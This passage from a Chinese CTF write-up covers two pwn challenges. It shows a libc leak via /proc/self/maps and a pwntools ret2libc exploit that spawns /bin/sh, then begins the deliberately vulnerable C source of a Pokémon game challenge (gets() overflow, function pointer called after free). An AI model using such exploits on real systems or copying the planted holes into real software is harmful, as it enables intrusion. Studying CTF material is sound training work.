class="number">00215000</span> <span class="number">08</span>:<span class="number">03</span> <span class="number">919725</span>                     /usr/lib/x86_64-linux-gnu/libc.so<span class="number">.6</span>\n<span class="number">&#x27;</span></span><br><span class="line">    b<span class="number">&#x27;768</span>d30816000<span class="number">-768</span>d3081a000 r--p <span class="number">00215000</span> <span class="number">08</span>:<span class="number">03</span> <span class="number">919725</span>                     /usr/lib/x86_64-linux-gnu/libc.so<span class="number">.6</span>\n<span class="number">&#x27;</span></span><br><span class="line">    b<span class="number">&#x27;768</span>d3081a000<span class="number">-768</span>d3081c000 rw-p <span class="number">00219000</span> <span class="number">08</span>:<span class="number">03</span> <span class="number">919725</span>                     /usr/lib/x86_64-linux-gnu/libc.so<span class="number">.6</span>\n<span class="number">&#x27;</span></span><br><span class="line">    b<span class="number">&#x27;768</span>d3081c000<span class="number">-768</span>d30829000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> \n<span class="number">&#x27;</span></span><br><span class="line">    b<span class="number">&#x27;768</span>d309c5000<span class="number">-768</span>d309c8000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> \n<span class="number">&#x27;</span></span><br><span class="line">    b<span class="number">&#x27;768</span>d309dc000<span class="number">-768</span>d309de000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> \n<span class="number">&#x27;</span></span><br><span class="line">    b<span class="number">&#x27;768</span>d309de000<span class="number">-768</span>d309e0000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">03</span> <span class="number">918161</span>                     /usr/lib/x86_64-linux-gnu/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>\n<span class="number">&#x27;</span></span><br><span class="line">    b<span class="number">&#x27;768</span>d309e0000<span class="number">-768</span>d30a0a000 r-xp <span class="number">00002000</span> <span class="number">08</span>:<span class="number">03</span> <span class="number">918161</span>                     /usr/lib/x86_64-linux-gnu/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>\n<span class="number">&#x27;</span></span><br><span class="line">    b<span class="number">&#x27;768</span>d30a0a000<span class="number">-768</span>d30a15000 r--p <span class="number">0002</span>c000 <span class="number">08</span>:<span class="number">03</span> <span class="number">918161</span>                     /usr/lib/x86_64-linux-gnu/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>\n<span class="number">&#x27;</span></span><br><span class="line">    b<span class="number">&#x27;768</span>d30a16000<span class="number">-768</span>d30a18000 r--p <span class="number">00037000</span> <span class="number">08</span>:<span class="number">03</span> <span class="number">918161</span>                     /usr/lib/x86_64-linux-gnu/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>\n<span class="number">&#x27;</span></span><br><span class="line">    b<span class="number">&#x27;768</span>d30a18000<span class="number">-768</span>d30a1a000 rTry to open\n<span class="number">&#x27;</span></span><br><span class="line">/home/qwq/ctf/ctf2024/<span class="number">2024</span>xsctf/origin/wahahabox/m.py:<span class="number">8</span>: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https:<span class="comment">//docs.pwntools.com/#bytes</span></span><br><span class="line">  p.recvuntil(<span class="string">&quot;rw-p 00000000 00:00 0 \n&quot;</span>)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"><span class="number">768</span>d309c5000<span class="number">-768</span>d309c8000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> </span><br><span class="line"><span class="number">768</span>d309dc000<span class="number">-768</span>d309de000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> </span><br><span class="line"><span class="number">768</span>d309de000<span class="number">-768</span>d309e0000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">03</span> <span class="number">918161</span>                     /usr/lib/x86_64-linux-gnu/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span></span><br><span class="line"><span class="number">768</span>d309e0000<span class="number">-768</span>d30a0a000 r-xp <span class="number">00002000</span> <span class="number">08</span>:<span class="number">03</span> <span class="number">918161</span>                     /usr/lib/x86_64-linux-gnu/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span></span><br><span class="line"><span class="number">768</span>d30a0a000<span class="number">-768</span>d30a15000 r--p <span class="number">0002</span>c000 <span class="number">08</span>:<span class="number">03</span> <span class="number">918161</span>                     /usr/lib/x86_64-linux-gnu/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span></span><br><span class="line"><span class="number">768</span>d30a16000<span class="number">-768</span>d30a18000 r--p <span class="number">00037000</span> <span class="number">08</span>:<span class="number">03</span> <span class="number">918161</span>                     /usr/lib/x86_64-linux-gnu/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span></span><br><span class="line"><span class="number">768</span>d30a18000<span class="number">-768</span>d30a1a000 rTry to open</span><br></pre></td></tr></table></figure>
+
+<p>不同glibc可能内存分布略有区别，这里用的是2.35的3.8</p>
+<p>有了libc地址之后（也可以获得elf地址，stack地址）。就直接栈溢出打system(“&#x2F;bin&#x2F;sh”)就行，如果遇到栈平衡问题，此时请把libc中的system地址+27，这样可以直接调用更底层函数do_system。</p>
+<blockquote>
+<p>当然也有其他getshell方法或者ORW。</p>
+</blockquote>
+<h2 id="TJ4h3">0X2 思路总结</h2>
+
+<p>scanf的输入，要输入&#x2F;proc&#x2F;self&#x2F;maps去泄露libc地址，然后栈溢出当普通ret2libc来做就可以了。</p>
+<h2 id="vQKCf">0x3 exp</h2>
+
+<p>getshell发现实在根目录，flag在&#x2F;home&#x2F;ctf目录</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"><span class="title function_">context</span><span class="params">(log_level=<span class="string">&quot;debug&quot;</span>)</span></span><br><span class="line">p=process(<span class="string">&#x27;./wahahabox&#x27;</span>)</span><br><span class="line"><span class="meta">#p=remote(<span class="string">&quot;43.248.97.213&quot;</span>,30057)</span></span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *$rebase(0x129a)&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;/proc/self/maps&quot;</span>)#./flag</span><br><span class="line"><span class="meta">#p.recvuntil(<span class="string">&quot;rw-p 00000000 00:00 0&quot;</span>)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;[heap]\n&quot;</span>)</span><br><span class="line"><span class="meta">#p.recvuntil(<span class="string">&quot;rw-p 00000000 00:00 0 \n&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">libc_addr=<span class="type">int</span>(p.recv(<span class="number">12</span>)[<span class="number">-12</span>:].rjust(<span class="number">16</span>,b<span class="number">&#x27;0&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">print(<span class="string">&quot;libc_addr&quot;</span>,hex(libc_addr))</span><br><span class="line">libcbase=libc_addr</span><br><span class="line">system=libcbase+<span class="number">0x50d70</span>+<span class="number">27</span></span><br><span class="line">bin_sh=libcbase+	<span class="number">0x1d8678</span></span><br><span class="line">pop_rdi=libcbase+<span class="number">0x2a3e5</span></span><br><span class="line">payload=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(bin_sh)+p64(system)</span><br><span class="line">print(<span class="string">&quot;libc_addr&quot;</span>,hex(libc_addr))</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="CBjVJ">Pokemon_master</h1>
+
+<p>:::info<br>宝可梦大师！<br>你是纪南镇的一名宝可梦新手，你已经达到了可以外出探险的年纪，请外出探险，成为伟大的冒险家吧！传闻外面有很强大的神兽，击败它会获得神器。</p>
+<p>TIPS：</p>
+<p>1.商店卖的防御剂有惊喜</p>
+<p>2.负数溢出</p>
+<p>3.选速度最快的精灵</p>
+<p>4.貌似有一个hook？</p>
+<p>5.覆水亦可收，free掉的堆块还能申请回来</p>
+<p>6.申请回特殊堆块可改写hook</p>
+<p>:::</p>
+<p>源码太长了，单独一桌</p>
+<p>基本原理不难，但是逆向难度对于新生来说是有点挑战性的(无论是代码量还是结构体逆向)，花点时间知道原理还是能做出来的，更何况放了那么多tips。</p>
+<p>游戏题：数组溢出、整数溢出比较多</p>
+<h2 id="uivlG">0x0 源码</h2>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span>   </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXMAX 9999</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MINMIN 1</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pokemon</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">16</span>];</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> hp;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> attack;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> speed;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> defence;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Start_choose</span><span class="params">(<span class="keyword">struct</span> pokemon** mypoke)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Start_print</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Mainmenu</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Outmenu</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Skillmenu</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Out</span><span class="params">(<span class="keyword">struct</span> pokemon** mypoke)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Store</span><span class="params">(<span class="keyword">struct</span> pokemon** mypoke)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Status</span><span class="params">(<span class="keyword">struct</span> pokemon** mypoke)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Pokemon_name</span><span class="params">(<span class="keyword">struct</span> pokemon** mypoke,<span class="type">char</span>* str)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Pokemon_print</span><span class="params">(<span class="keyword">struct</span> pokemon** mypoke)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">Fight</span><span class="params">(<span class="keyword">struct</span> pokemon** mypoke,<span class="keyword">struct</span> pokemon* emerypoke)</span>;</span><br><span class="line"><span class="type">int</span> money=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> change=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> *ex1t;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//函数指针  堆</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	init();</span><br><span class="line">	Start_print();</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> choice;</span><br><span class="line">    <span class="type">char</span> say[<span class="number">32</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pokemon</span>* <span class="title">mypoke</span>;</span></span><br><span class="line">    Start_choose(&amp;mypoke);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You open the Starter Pack and get a hundred coins&quot;</span>);</span><br><span class="line">    money+=<span class="number">100</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;gift:%p\n&quot;</span>,&amp;<span class="built_in">puts</span>);</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">        whilestart:</span><br><span class="line">        <span class="keyword">if</span>(money &lt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;No money, you out:(&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">		Mainmenu();</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;choice);</span><br><span class="line">        <span class="keyword">switch</span> (choice)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            Store(&amp;mypoke); <span class="comment">//STORE</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:     <span class="comment">//OUT</span></span><br><span class="line">            Out(&amp;mypoke);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:  <span class="comment">//STATUS</span></span><br><span class="line">            Status(&amp;mypoke);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="comment">/* code */</span></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;\nWhat you want to say?&quot;</span>);</span><br><span class="line">            gets(say);</span><br><span class="line">            (*(<span class="type">void</span>(*)(<span class="type">char</span>*))ex1t[<span class="number">0</span>])(say);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">666</span>:</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Why does technology make Pokémon?&quot;</span>);</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">pokemon</span>* <span class="title">test</span>;</span></span><br><span class="line">            test=(<span class="keyword">struct</span> pokemon*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pokemon));</span><br><span class="line">            read(<span class="number">0</span>,&amp;test-&gt;name[<span class="number">0</span>],<span class="number">0x10</span>);</span><br><span class="line">            test-&gt;hp=<span class="number">1</span>;</span><br><span class="line">            test-&gt;speed=<span class="number">1</span>;</span><br><span class="line">            test-&gt;attack=<span class="number">1</span>;</span><br><span class="line">            test-&gt;defence=<span class="number">1</span>;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s so weak...&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">goto</span> whilestart;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//收集数据</span></span><br><span class="line">        <span class="comment">//数据处理</span></span><br><span class="line">        <span class="comment">//绘制图像</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Outmenu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You walked into the Divine Beast Forest, hoping to meet the Divine Beast QWQ...&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;There are two roads in front of you, choose the one on the left or the one on the right.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1.left&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2.right&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Out</span><span class="params">(<span class="keyword">struct</span> pokemon** mypoke)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> choice=<span class="number">0</span>;</span><br><span class="line">    Outmenu();</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;choice);</span><br><span class="line">    <span class="keyword">switch</span> (choice)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">pokemon</span> *<span class="title">QWQ</span>;</span></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;You&#x27;re very lucky, it&#x27;s the Divine Beast QWQ that roars in front of you, let&#x27;s grab it and knock it out first!&quot;</span>);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;QWQ: qwq~ qwq~ qwq~ qwq~ qwq~ qwq~&quot;</span>);</span><br><span class="line">            QWQ=(<span class="keyword">struct</span> pokemon*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pokemon));</span><br><span class="line">            QWQ-&gt;hp=MAXMAX;</span><br><span class="line">            QWQ-&gt;speed=<span class="number">15</span>;</span><br><span class="line">            QWQ-&gt;defence=MAXMAX;</span><br><span class="line">            QWQ-&gt;attack=MAXMAX;</span><br><span class="line">            Pokemon_name(&amp;QWQ,<span class="string">&quot;QWQ&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(Fight(mypoke,QWQ))&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;The soul of the mythical beast flew away...&quot;</span>);</span><br><span class="line">                <span class="built_in">free</span>(ex1t);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Loser...&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">free</span>(QWQ);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">pokemon</span> *<span class="title">TAT</span>;</span></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;You haven&#x27;t encountered a beast, but you&#x27;ve encountered a TAT that guards the treasure, so try to stun it for some loot&quot;</span>);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;TAT: WTF!&quot;</span>);</span><br><span class="line">            TAT=(<span class="keyword">struct</span> pokemon*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pokemon));</span><br><span class="line">            TAT-&gt;hp=MINMIN;</span><br><span class="line">            TAT-&gt;speed=<span class="number">15</span>;</span><br><span class="line">            TAT-&gt;defence=MINMIN;</span><br><span class="line">            TAT-&gt;attack=MINMIN;</span><br><span class="line">            Pokemon_name(&amp;TAT,<span class="string">&quot;TAT&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(Fight(mypoke,TAT))&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Your earn some money~&quot;</span>);</span><br><span class="line">                money+=<span class="number">200</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Loser...&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">free</span>(TAT);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Skillmenu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;When the battle begins, choose the skill you want to use&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1.Attack  2.Defence&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3.Escape  4.Surrender&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Fight</span><span class="params">(<span class="keyword">struct</span> pokemon** mypoke,<span class="keyword">struct</span> pokemon* emerypoke)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> myspeed = (*mypoke)-&gt;speed;</span><br><span class="line">    <span class="type">int</span> emspeed = emerypoke-&gt;speed;</span><br><span class="line">    <span class="type">int</span> myhp=(*mypoke)-&gt;hp;</span><br><span class="line">    <span class="type">int</span> emhp=emerypoke-&gt;hp;</span><br><span class="line">    <span class="type">int</span> faster=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span 